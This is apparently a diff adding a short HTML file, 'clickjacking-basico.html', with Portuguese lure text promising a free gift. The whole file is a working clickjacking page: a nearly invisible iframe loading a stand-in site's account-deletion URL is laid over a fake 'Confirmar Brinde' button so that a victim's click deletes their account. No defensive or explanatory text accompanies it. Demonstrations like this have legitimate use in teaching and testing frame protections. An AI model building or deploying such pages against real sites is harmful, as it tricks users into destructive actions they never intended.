@@ -1,0 +1,17 @@
+<!-- clickjacking-basico.html -->
+<html>
+  <body>
+    <h1>Ganhe um brinde grátis!</h1>
+    <p>Clique no botão abaixo para confirmar seu brinde:</p>
+
+    <!-- Iframe da ação real -->
+    <iframe src="https://www.site.com/conta/deletar"
+            style="opacity: 0.01; position: absolute; top: 0; left: 0; width: 800px; height: 600px; border: none; z-index: 2;">
+    </iframe>
+
+    <!-- Botão falso, alinhado sobre o botão real -->
+    <button style="z-index: 1; position: absolute; top: 250px; left: 100px; font-size: 20px;">
+      Confirmar Brinde 🎁
+    </button>
+  </body>
+</html>
